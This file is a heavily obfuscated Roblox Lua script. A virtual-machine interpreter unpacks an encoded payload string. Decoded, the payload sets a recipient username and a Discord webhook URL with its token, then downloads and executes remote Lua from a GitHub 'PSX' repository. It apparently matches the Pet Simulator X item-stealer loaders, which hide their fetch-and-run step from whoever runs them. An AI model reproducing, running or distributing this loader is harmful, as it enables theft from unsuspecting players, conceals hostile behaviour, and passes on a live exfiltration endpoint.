do
	local v0 = tonumber;
	local v1 = string.byte;
	local v2 = string.char;
	local v3 = string.sub;
	local v4 = string.gsub;
	local v5 = string.rep;
	local v6 = table.concat;
	local v7 = table.insert;
	local v8 = math.ldexp;
	local v9 = getfenv or function()
		return _ENV;
	end;
	local v10 = setmetatable;
	local v11 = pcall;
	local v12 = select;
	local v13 = unpack or table.unpack;
	local v14 = tonumber;
	local function v15(v16, v17, ...)
		local v18 = 1;
		local v19;
		v16 = v4(v3(v16, 5), "..", function(v20)
			if (v1(v20, 2) == 79) then
				v19 = v0(v3(v20, 1, 1));
				return "";
			else
				local v72 = v2(v0(v20, 16));
				if v19 then
					local v79 = 0;
					local v80;
					while true do
						if (v79 == 0) then
							v80 = v5(v72, v19);
							v19 = nil;
							v79 = 1;
						end
						if (1 == v79) then
							return v80;
						end
					end
				else
					return v72;
				end
			end
		end);
		local function v21(v22, v23, v24)
			if v24 then
				local v73 = (v22 / ((953 - (435 + 66 + 450)) ^ (v23 - (1 + 0)))) % ((2 + 0) ^ (((v24 - (1127 - (217 + 446 + (1160 - 697)))) - (v23 - (557 - (484 + 72)))) + 1));
				return v73 - (v73 % 1);
			else
				local v74 = 2 ^ (v23 - (1 + 0));
				return (((v22 % (v74 + v74)) >= v74) and (683 - (347 + 335))) or (0 + 0);
			end
		end
		local function v25()
			local v38 = v1(v16, v18, v18);
			v18 = v18 + 1;
			return v38;
		end
		local function v26()
			local v39, v40 = v1(v16, v18, v18 + 1 + 1);
			v18 = v18 + (565 - (370 + 193));
			return (v40 * 256) + v39;
		end
		local function v27()
			local v41, v42, v43, v44 = v1(v16, v18, v18 + (8 - 5));
			v18 = v18 + 4;
			return (v44 * (16777373 - (42 + 115))) + (v43 * (66709 - (514 + 28 + 631))) + (v42 * 256) + v41;
		end
		local function v28()
			local v45 = v27();
			local v46 = v27();
			local v47 = 4 - (7 - 4);
			local v48 = (v21(v46, 1 + 0, 397 - (311 + 66)) * ((2 + 0) ^ ((615 - (325 + 235)) - 23))) + v45;
			local v49 = v21(v46, (63 + 194) - (162 + 74), 31);
			local v50 = ((v21(v46, 22 + 10) == ((930 - (185 + 744)) - (0 + 0))) and -(49 - (10 + 38))) or (388 - (188 + 199));
			if (v49 == (0 - 0)) then
				if (v48 == 0) then
					return v50 * (0 + 0);
				else
					v49 = 1 + 0;
					v47 = 1727 - (1346 + 381);
				end
			elseif (v49 == 2047) then
				return ((v48 == (0 - 0)) and (v50 * ((1 + 0) / (0 - 0)))) or (v50 * NaN);
			end
			return v8(v50, v49 - 1023) * (v47 + (v48 / ((1 + 0 + 1) ^ (110 - 58))));
		end
		local function v29(v30)
			local v51;
			if not v30 then
				local v75 = 0 - 0;
				while true do
					if (v75 == (0 - 0)) then
						v30 = v27();
						if (v30 == (0 + 0)) then
							return "";
						end
						break;
					end
				end
			end
			v51 = v3(v16, v18, (v18 + v30) - (1 + 0));
			v18 = v18 + v30;
			local v52 = {};
			for v64 = 1 + 0, #v51 do
				v52[v64] = v2(v1(v3(v51, v64, v64)));
			end
			return v6(v52);
		end
		local v31 = v27;
		local function v32(...)
			return {...}, v12("#", ...);
		end
		local function v33()
			local v53 = 0;
			local v54;
			local v55;
			local v56;
			local v57;
			local v58;
			local v59;
			local v60;
			while true do
				if (v53 ~= 0) then
				else
					local v76 = 0;
					while true do
						if (v76 ~= (1 + 0)) then
						else
							v53 = 1;
							break;
						end
						if (v76 == (0 - 0)) then
							local v93 = 0 + 0;
							while true do
								if (v93 == 0) then
									v54 = 1493 - (141 + 1352);
									v55 = nil;
									v93 = 2 - 1;
								end
								if (v93 == 1) then
									v76 = 1;
									break;
								end
							end
						end
					end
				end
				if (v53 == 3) then
					v60 = nil;
					while true do
						local v81 = 0;
						local v82;
						while true do
							if (v81 == (0 + 0)) then
								v82 = 437 - (172 + 265);
								while true do
									if (v82 == (1 - 0)) then
										if (v54 == (1 + 0)) then
											local v104 = 0 + 0;
											local v105;
											while true do
												if (v104 == (0 + 0)) then
													v105 = 0;
													while true do
														if (v105 ~= (1 + 0)) then
														else
															v60 = {};
															v54 = 2;
															break;
														end
														if ((0 - 0) ~= v105) then
														else
															local v111 = 0;
															local v112;
															while true do
																if (v111 == 0) then
																	v112 = 234 - (153 + 81);
																	while true do
																		if (v112 == (1851 - (450 + 1400))) then
																			v105 = 1;
																			break;
																		end
																		if (v112 ~= 0) then
																		else
																			local v154 = 0 + 0;
																			while true do
																				if (v154 == (0 + 0)) then
																					v58 = {v55,v56,nil,v57};
																					v59 = v27();
																					v154 = 1;
																				end
																				if (v154 ~= 1) then
																				else
																					v112 = 1;
																					break;
																				end
																			end
																		end
																	end
																	break;
																end
															end
														end
													end
													break;
												end
											end
										end
										if (v54 == 2) then
											local v106 = 0 + 0;
											local v107;
											while true do
												if (v106 == (0 + 0)) then
													v107 = 0 - 0;
													while true do
														if (v107 == (3 - 2)) then
															for v122 = 1 - 0, v27() do
																local v123 = 0 - 0;
																local v124;
																local v125;
																while true do
																	if (v123 == (428 - (211 + 217))) then
																		local v152 = 0;
																		local v153;
																		while true do
																			if (v152 == 0) then
																				v153 = 1118 - (1066 + 52);
																				while true do
																					if (v153 == (0 - 0)) then
																						v124 = 607 - (398 + 209);
																						v125 = nil;
																						v153 = 1 + 0;
																					end
																					if (v153 == 1) then
																						v123 = 1 - 0;
																						break;
																					end
																				end
																				break;
																			end
																		end
																	end
																	if (v123 == 1) then
																		while true do
																			if (v124 == (1284 - (884 + 400))) then
																				v125 = v25();
																				if (v21(v125, 1, 667 - (357 + 309)) ~= (0 - 0)) then
																				else
																					local v164 = 0 + 0;
																					local v165;
																					local v166;
																					local v167;
																					while true do
																						if (v164 == (3 + 0)) then
																							if (v21(v166, 3, 3) == (1 + 0)) then
																								v167[1992 - (1917 + 71)] = v60[v167[4 + 0]];
																							end
																							v55[v122] = v167;
																							break;
																						end
																						if (v164 ~= (4 - 2)) then
																						else
																							local v173 = 0 - 0;
																							while true do
																								if (1 == v173) then
																									v164 = 3;
																									break;
																								end
																								if (v173 ~= (0 - 0)) then
																								else
																									if (v21(v166, 1, 1 + 0) ~= (1905 - (130 + 1774))) then
																									else
																										v167[2] = v60[v167[2]];
																									end
																									if (v21(v166, 6 - 4, 3 - 1) ~= (3 - 2)) then
																									else
																										v167[1 + 2] = v60[v167[14 - 11]];
																									end
																									v173 = 2 - 1;
																								end
																							end
																						end
																						if ((630 - (189 + 441)) == v164) then
																							v165 = v21(v125, 2, 3);
																							v166 = v21(v125, 3 + 1, 6);
																							v164 = 1;
																						end
																						if (v164 == 1) then
																							local v174 = 1710 - (387 + 1323);
																							local v175;
																							while true do
																								if (v174 == (0 - 0)) then
																									v175 = 0 - 0;
																									while true do
																										if ((0 + 0) == v175) then
																											v167 = {v26(),v26(),nil,nil};
																											if (v165 == 0) then
																												local v189 = 0 + 0;
																												local v190;
																												local v191;
																												local v192;
																												while true do
																													if ((122 - (66 + 55)) == v189) then
																														v192 = nil;
																														while true do
																															if (v190 == 0) then
																																local v195 = 0;
																																while true do
																																	if (v195 == (0 - 0)) then
																																		v191 = 0 + 0;
																																		v192 = nil;
																																		v195 = 1645 - (793 + 851);
																																	end
																																	if (v195 == (1180 - (1166 + 13))) then
																																		v190 = 1;
																																		break;
																																	end
																																end
																															end
																															if (1 ~= v190) then
																															else
																																while true do
																																	if (v191 == (1345 - (40 + 1305))) then
																																		v192 = 0;
																																		while true do
																																			if (v192 == (91 - (51 + 40))) then
																																				v167[6 - 3] = v26();
																																				v167[1 + 3] = v26();
																																				break;
																																			end
																																		end
																																		break;
																																	end
																																end
																																break;
																															end
																														end
																														break;
																													end
																													if (v189 ~= (0 + 0)) then
																													else
																														v190 = 0 - 0;
																														v191 = nil;
																														v189 = 1;
																													end
																												end
																											elseif (v165 == (3 - 2)) then
																												v167[1674 - (554 + 1117)] = v27();
																											elseif (v165 == (1 + 1)) then
																												v167[11 - 8] = v27() - (2 ^ (15 + 1));
																											elseif (v165 == (1692 - (220 + 1469))) then
																												local v196 = 406 - (109 + 297);
																												local v197;
																												local v198;
																												while true do
																													if (v196 == (695 - (191 + 504))) then
																														v197 = 0 - 0;
																														v198 = nil;
																														v196 = 4 - 3;
																													end
																													if (v196 == 1) then
																														while true do
																															if (v197 == 0) then
																																v198 = 0 + 0;
																																while true do
																																	if (v198 == 0) then
																																		v167[726 - (42 + 681)] = v27() - (2 ^ (15 + 1));
																																		v167[4] = v26();
																																		break;
																																	end
																																end
																																break;
																															end
																														end
																														break;
																													end
																												end
																											end
																											v175 = 1;
																										end
																										if (v175 ~= 1) then
																										else
																											v164 = 3 - 1;
																											break;
																										end
																									end
																									break;
																								end
																							end
																						end
																					end
																				end
																				break;
																			end
																		end
																		break;
																	end
																end
															end
															v54 = 3;
															break;
														end
														if (v107 ~= 0) then
														else
															for v126 = 1, v59 do
																local v127 = 0;
																local v128;
																local v129;
																local v130;
																local v131;
																while true do
																	if (v127 == (4 - 2)) then
																		while true do
																			if (v128 ~= 0) then
																			else
																				local v161 = 0;
																				while true do
																					if (v161 ~= (0 - 0)) then
																					else
																						v129 = 0;
																						v130 = nil;
																						v161 = 1 + 0;
																					end
																					if (1 ~= v161) then
																					else
																						v128 = 1;
																						break;
																					end
																				end
																			end
																			if (v128 ~= 1) then
																			else
																				v131 = nil;
																				while true do
																					if (v129 == 0) then
																						v130 = v25();
																						v131 = nil;
																						v129 = 1698 - (1541 + 156);
																					end
																					if (v129 == (88 - (35 + 52))) then
																						if (v130 == 1) then
																							v131 = v25() ~= (0 + 0);
																						elseif (v130 == 2) then
																							v131 = v28();
																						elseif (v130 == 3) then
																							v131 = v29();
																						end
																						v60[v126] = v131;
																						break;
																					end
																				end
																				break;
																			end
																		end
																		break;
																	end
																	if ((0 + 0) ~= v127) then
																	else
																		v128 = 0;
																		v129 = nil;
																		v127 = 1;
																	end
																	if (v127 == 1) then
																		v130 = nil;
																		v131 = nil;
																		v127 = 2;
																	end
																end
															end
															v58[2 + 1] = v25();
															v107 = 1 + 0;
														end
													end
													break;
												end
											end
										end
										break;
									end
									if ((31 - (10 + 21)) == v82) then
										local v102 = 0;
										local v103;
										while true do
											if (0 ~= v102) then
											else
												v103 = 0;
												while true do
													if (v103 == (0 - 0)) then
														local v110 = 24 - (11 + 13);
														while true do
															if (v110 == (0 - 0)) then
																if (v54 ~= (0 + 0)) then
																else
																	local v145 = 426 - (244 + 182);
																	while true do
																		if (v145 ~= 0) then
																		else
																			local v155 = 1229 - (1010 + 219);
																			while true do
																				if (v155 == 0) then
																					v55 = {};
																					v56 = {};
																					v155 = 1;
																				end
																				if (1 ~= v155) then
																				else
																					v145 = 4 - 3;
																					break;
																				end
																			end
																		end
																		if (v145 ~= 1) then
																		else
																			v57 = {};
																			v54 = 1 - 0;
																			break;
																		end
																	end
																end
																if ((1 + 2) == v54) then
																	local v146 = 1813 - (968 + 845);
																	local v147;
																	while true do
																		if (v146 == 0) then
																			v147 = 0;
																			while true do
																				local v162 = 0;
																				while true do
																					if (v162 ~= 0) then
																					else
																						if ((0 + 0) ~= v147) then
																						else
																							local v176 = 0;
																							while true do
																								if (v176 == (0 - 0)) then
																									for v181 = 1, v27() do
																										v56[v181 - (1 - 0)] = v33();
																									end
																									for v183 = 1, v27() do
																										v57[v183] = v27();
																									end
																									v176 = 1;
																								end
																								if (v176 == 1) then
																									v147 = 226 - (150 + 75);
																									break;
																								end
																							end
																						end
																						if (v147 ~= 1) then
																						else
																							return v58;
																						end
																						break;
																					end
																				end
																			end
																			break;
																		end
																	end
																end
																v110 = 1;
															end
															if ((1 - 0) == v110) then
																v103 = 1 + 0;
																break;
															end
														end
													end
													if (v103 == (4 - 3)) then
														v82 = 1;
														break;
													end
												end
												break;
											end
										end
									end
								end
								break;
							end
						end
					end
					break;
				end
				if ((1 - 0) ~= v53) then
				else
					local v77 = 1881 - (810 + 1071);
					while true do
						if (1 ~= v77) then
						else
							v53 = 2;
							break;
						end
						if (v77 == (817 - (282 + 535))) then
							v56 = nil;
							v57 = nil;
							v77 = 1 + 0;
						end
					end
				end
				if (2 == v53) then
					local v78 = 0 - 0;
					while true do
						if (v78 == (0 + 0)) then
							v58 = nil;
							v59 = nil;
							v78 = 158 - (116 + 41);
						end
						if (v78 ~= (769 - (406 + 362))) then
						else
							v53 = 3;
							break;
						end
					end
				end
			end
		end
		local function v34(v35, v36, v37)
			local v61 = v35[1];
			local v62 = v35[2];
			local v63 = v35[3];
			return function(...)
				local v66 = 0;
				local v67;
				local v68;
				local v69;
				local v70;
				local v71;
				while true do
					if (v66 == 3) then
						A, B = v32(v11(v71));
						if not A[1] then
							local v94 = v35[4][v67] or "?";
							error("Script error at [" .. v94 .. "]:" .. A[2]);
						else
							return v13(A, 2, B);
						end
						break;
					end
					if (v66 == 1) then
						v69 = {...};
						v70 = v12("#", ...) - 1;
						v66 = 2;
					end
					if (v66 == 0) then
						v67 = 1;
						v68 = -1;
						v66 = 1;
					end
					if (v66 == 2) then
						v71 = nil;
						v71 = function()
							local v83 = v61;
							local v84 = v62;
							local v85 = v63;
							local v86 = v32;
							local v87 = {};
							local v88 = {};
							local v89 = {};
							for v95 = 1720 - (1253 + 467), v70 do
								if ((v95 >= v85) or (2896 <= (776 + (1639 - 663)))) then
									v87[v95 - v85] = v69[v95 + 1];
								else
									v89[v95] = v69[v95 + (3 - (725 - (340 + 383)))];
								end
							end
							local v90 = (v70 - v85) + 1 + (0 - 0);
							local v91;
							local v92;
							while true do
								local v96 = 91 - (6 + 85);
								local v97;
								while true do
									if ((2495 > (1163 + 957)) and (v96 == 0)) then
										v97 = 0 + 0;
										while true do
											if ((v97 == (2 - 1)) or ((1116 + 3587) == 4537)) then
												if ((v92 <= (6 - 1)) or ((92 + 808) > (2594 - (220 + 256)))) then
													if (((9554 - 7223) <= (4429 - (1396 + 597))) and (v92 <= (574 - (494 + (291 - 213))))) then
														if (((1316 + 3180) > (1146 + 1736 + 348)) and (v92 <= (1954 - (1625 + 329)))) then
															if ((v89[v91[1280 - (342 + 936)]] == v91[11 - 7]) or ((7484 - 2795) == (1309 + 387))) then
																v67 = v67 + 1 + 0 + 0;
															else
																v67 = v91[3];
															end
														elseif (((8763 - 4589) > (2337 + 1632)) and (v92 > (1 - 0))) then
															do
																return;
															end
														else
															v89[v91[1337 - (873 + 462)]] = v91[12 - 9] ~= ((1355 - (733 + 622)) + (0 - 0));
														end
													elseif ((v92 <= (1149 - (218 + (2168 - (952 + 288))))) or ((738 + 2940) <= 755)) then
														v37[v91[1 + 2]] = v89[v91[(3284 - 1834) - (25 + 753 + 670)]];
													elseif ((v92 == (347 - (67 + (427 - (131 + 20))))) or ((5032 - 3406) < (389 + 1172))) then
														for v148 = v91[5 - 3], v91[4 - 1] do
															v89[v148] = nil;
														end
													else
														v89[v91[1230 - (857 + 371)]] = v37[v91[1 + 2]];
													end
												elseif (((2729 + 2231) == (6384 - (230 + 1194))) and (v92 <= 8)) then
													if ((((226 + 1785) - ((3115 - 1736) + 74)) <= (871 + 1842)) and (v92 <= (9 - 3))) then
														local v116 = 0 - 0;
														local v117;
														while true do
															if ((v116 == (0 - 0)) or (((2872 - (411 + 1536)) + (4103 - (928 + 965))) < (1749 + 721))) then
																v117 = v91[1195 - (623 + 570)];
																v89[v117] = v89[v117](v13(v89, v117 + (2 - 1), v68));
																break;
															end
														end
													elseif (((4668 - (136 + 785)) == (6779 - 3032)) and (v92 == 7)) then
														v67 = v91[1 + 2];
													else
														v89[v91[2 + 0]] = v91[(2160 - (704 + 153)) - ((1867 - (607 + 811)) + 851)];
													end
												elseif (((1225 - (1878 - 1447)) > (869 - 170)) and (v92 <= ((16 + 11) - 18))) then
													local v118 = 0 - 0;
													local v119;
													local v120;
													local v121;
													while true do
														if ((549 < ((794 - (258 + 516)) + (1426 - (20 + 406)))) and (v118 == 0)) then
															v119 = 0 - 0;
															v120 = nil;
															v118 = 1;
														end
														if (((2525 - (155 + 22 + 27)) == (614 + 1707)) and (v118 == 1)) then
															v121 = nil;
															while true do
																if (((2575 - ((1855 - (1319 + 198)) + 41)) <= (366 + 3360)) and (v119 == 0)) then
																	v120 = v91[6 - 4];
																	v121 = v89[v91[1 + 2]];
																	v119 = 1634 - (683 + 950);
																end
																if ((v119 == 1) or ((449 + 559) >= (715 + 3367))) then
																	v89[v120 + (4 - 3)] = v121;
																	v89[v120] = v121[v91[4]];
																	break;
																end
															end
															break;
														end
													end
												elseif (((182 + 539) <= (5515 - (1365 + (2066 - (1313 + 224))))) and (v92 > 10)) then
													local v139 = 1959 - (1540 + 419);
													local v140;
													local v141;
													local v142;
													local v143;
													local v144;
													while true do
														if (((4838 - 2316) < 3689) and (((1262 + 601) - (127 + 798 + 936)) == v139)) then
															v144 = nil;
															while true do
																if ((v140 == 0) or (3045 >= 3220)) then
																	local v163 = 0 + 0;
																	while true do
																		if (((99 + 159) < (4307 - 2943)) and (v163 == (605 - (29 + 280 + 76 + 219)))) then
																			v140 = 1 + (790 - (544 + 246));
																			break;
																		end
																		if (((0 + 0) == v163) or ((4634 - (1710 + (522 - 273))) < (3139 - (720 + (3240 - 2090))))) then
																			v141 = v91[5 - 3];
																			v142, v143 = v86(v89[v141](v13(v89, v141 + (1 - 0), v91[2 + 1])));
																			v163 = 1 + 0;
																		end
																	end
																end
																if (((1045 + 2803) >= (118 + 180)) and (v140 == 2)) then
																	for v168 = v141, v68 do
																		local v169 = 856 - (173 + (1031 - 348));
																		while true do
																			if ((v169 == (0 + 0)) or (1423 == (393 - 104))) then
																				v144 = v144 + (808 - ((1481 - 800) + 126));
																				v89[v168] = v142[v144];
																				break;
																			end
																		end
																	end
																	break;
																end
																if ((v140 == (3 - 2)) or (1346 > (5448 - (794 + 170)))) then
																	v68 = (v143 + v141) - 1;
																	v144 = (1310 - (1079 + 231)) - 0;
																	v140 = 2 + 0;
																end
															end
															break;
														end
														if (((3276 - (906 + (527 - 277))) <= (6434 - ((1632 - 1066) + (3509 - 2122)))) and (v139 == (1 - 0))) then
															v142 = nil;
															v143 = nil;
															v139 = 1256 - (597 + 657);
														end
														if ((v139 == (1969 - (1714 + (363 - 108)))) or ((17 + 11 + (678 - 205)) == ((9369 - (864 + 110)) - (8235 - (1156 + 473))))) then
															v140 = 0;
															v141 = nil;
															v139 = 1 + 0;
														end
													end
												else
													v89[v91[(38 + 3) - (29 + 10)]]();
												end
												v67 = v67 + (547 - (329 + 217));
												break;
											end
											if (((1277 + 2569 + 209) <= (5718 - 1357)) and ((0 + 0 + 0) == v97)) then
												v91 = v83[v67];
												v92 = v91[1];
												v97 = 1 + 0;
											end
										end
										break;
									end
								end
							end
						end;
						v66 = 3;
					end
				end
			end;
		end
		return v34(v33(), {}, v17)(...);
	end
	v15("LOL!0A3O00028O00026O00F03F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033D3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4861726447616D6553732F5053582F6D61696E2F4E65772E6C756103083O00557365724E616D65030A3O004142755F44686142696403073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F31303836332O30353439332O3133372O3338332F6E6548544C352D30654E6B35463357552D4A436437525A68425F4D484E432O3458614F754D434C34574C3845743037613034326B41753849666276384D792D7734796650001B3O0012083O00014O0004000100013O00264O0002000100010004073O00020001001208000100013O00262O00010010000100020004073O00100001001205000200033O001205000300043O002009000300030005001208000500064O0001000600014O000B000300064O000600023O00022O000A0002000100010004073O001A000100262O00010005000100010004073O00050001001208000200083O001203000200073O0012080002000A3O001203000200093O001208000100023O0004073O000500010004073O001A00010004073O000200012O00023O00017O001B3O00023O00033O00053O00053O00063O00083O00083O00093O00093O00093O00093O00093O00093O00093O00093O000A3O000C3O000C3O000D3O000D3O000E3O000E3O000F3O00103O00123O00133O00153O00", v9(), ...);
end
